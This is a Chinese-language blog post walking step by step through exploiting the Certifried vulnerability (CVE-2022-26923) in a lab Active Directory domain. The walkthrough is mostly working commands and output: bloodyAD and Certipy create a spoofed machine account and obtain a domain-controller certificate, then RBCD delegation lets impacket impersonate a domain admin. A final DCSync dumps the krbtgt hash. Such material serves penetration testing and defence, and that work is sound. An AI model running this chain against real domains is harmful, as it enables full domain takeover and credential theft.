---
title: 利用 Certifried (CVE-2022-26923)
summary: 了解如何使用 bloodyAD 轻松利用 Certifried 漏洞。
date: 2024-05-11
authors:
  - soka
  - admin

tags:
  - Authentication
  - CVE
  - Exploit
  - bloodyAD
  - Microsoft

categories:
  - Active Directory
---

最近，微软修复了 Certifried (CVE-2022-26923) 漏洞，并发布了这篇[博客文章](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)。以下是如何使用 [bloodyAD](https://github.com/CravateRouge/bloodyAD) 在不使用 PKINIT 的情况下利用此漏洞的示例。

## Linux

我们需要一台机器，可以是已被攻陷的机器，也可以在 `ms-DS-MachineAccountQuota` > 0 的情况下创建一台：
```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 get object 'DC=crashlab,DC=local' --attr ms-DS-MachineAccountQuota                     

distinguishedName: DC=crashlab,DC=local
ms-DS-MachineAccountQuota: 10
```

我们在 LDAP 中创建一个名为 `cve` 的计算机对象：
```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 addComputer cve 'CVEPassword1234*'

[+] cve created
```

然后，我们更改 `dNSHostName` 属性（创建对象时为空），使其与域控制器的计算机名称匹配：`CRASHDC.crashlab.local`。
```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 set object 'CN=cve,CN=Computers,DC=crashlab,DC=local' dNSHostName -v CRASHDC.crashlab.local

[+] CN=cve,CN=Computers,DC=crashlab,DC=local's dnsHostName has been updated
```

验证属性是否已正确配置：
```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 get object 'CN=cve,CN=Computers,DC=crashlab,DC=local' --attr dNSHostName                  

distinguishedName: CN=cve,CN=Computers,DC=crashlab,DC=local
dNSHostName: CRASHDC.crashlab.local
```

接下来，我们使用 [Certipy](https://github.com/ly4k/Certipy) 请求 `cve` 计算机的证书：
```ps1
# 10.100.10.13 is the ADCS server
> certipy req 'crashlab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.100.10.12 -ca crashlab-ADCS-CA
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with DNS Host Name 'CRASHDC.crashlab.local'
[*] Saved certificate and private key to 'crashdc.pfx'
```

现在，我们尝试使用 [Certipy](https://github.com/ly4k/Certipy) 和之前请求的证书获取 TGT：
```ps1
> certipy auth -pfx ./crashdc.pfx -dc-ip 10.100.10.12
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: crashdc$@crashlab.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

如果 PKINIT 在此 AD 上不可用，我们可以尝试使用 [bloodyAD](https://github.com/CravateRouge/bloodyAD) 的证书认证功能和 RBCD 技术：
```ps1
> openssl pkcs12 -in crashdc.pfx -out crashdc.pem -nodes
> python bloodyAD.py -d crashlab.local  -c ":crashdc.pem" -u 'cve$' --host 10.100.10.12 add rbcd 'CRASHDC$' 'CVE$'
[+] CVE$ SID is: S-1-5-21-1945936656-2616711065-1665664270-1134             
[+] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity correctly set        
[+] Delegation rights modified successfully!                                                                           
CVE$ can now impersonate users on CRASHDC$ via S4U2Proxy
```

设置委派权限后，我们可以使用 [impacket](https://github.com/SecureAuthCorp/impacket) 的 `getST.py` 工具冒充域管理员（在本例中为 `emacron`）并获取 TGT：
```ps1
> getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*'                 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                                               
                                                                                                                       
[*] Getting TGT for user                                                                                               
[*] Impersonating emacron                                                                                              
[*]     Requesting S4U2self                                                                                            
[*]     Requesting S4U2Proxy
[*] Saving ticket in emacron.ccache

> cp emacron.ccache /tmp/
> export KRB5CCNAME=/tmp/emacron.ccache
```

最后，我们使用 [impacket](https://github.com/SecureAuthCorp/impacket) 的 `secretsdump.py` 工具，通过获取的 TGT 执行 DCSync：
```ps1
> secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:492850f62466ef2bd1f4a56f112e01f1::: (status=Disabled)
[*] Cleaning up...
```